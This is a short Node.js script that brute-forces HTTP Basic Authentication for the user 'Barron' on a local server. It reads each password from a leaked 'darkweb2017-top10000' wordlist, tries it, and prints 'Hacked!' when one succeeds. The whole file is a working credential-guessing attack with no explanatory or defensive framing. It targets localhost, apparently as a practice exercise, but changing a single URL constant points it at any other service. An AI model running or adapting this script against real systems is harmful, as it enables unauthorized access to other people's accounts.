const fs = require('fs');
const readline = require('readline');
const axios = require('axios');

const API_URL = 'http://localhost:3000';
const USERNAME = 'Barron';

async function tryLogin(password) {
  try {
    const response = await axios.get(API_URL, {
      auth: { username: USERNAME, password: password }
    });

    if (response.status === 200) {
      console.log(`Hacked! Password is: ${password}`);
      process.exit(0);
    }
  } catch (error) {
    // if (error.response && error.response.status === 401) {
    //   console.log(`Failed: ${password}`);
    // } else {
    //   console.error(`Error: ${error.message}`);
    // }
  }
}

async function readPasswords() {
  const readInterface = readline.createInterface({
    input: fs.createReadStream('darkweb2017-top10000.txt'),
    output: process.stdout,
    console: false
  });

  for await (const line of readInterface) {
    await tryLogin(line.trim()); 
  }

  console.log('All passwords checked but none worked');
}

readPasswords();
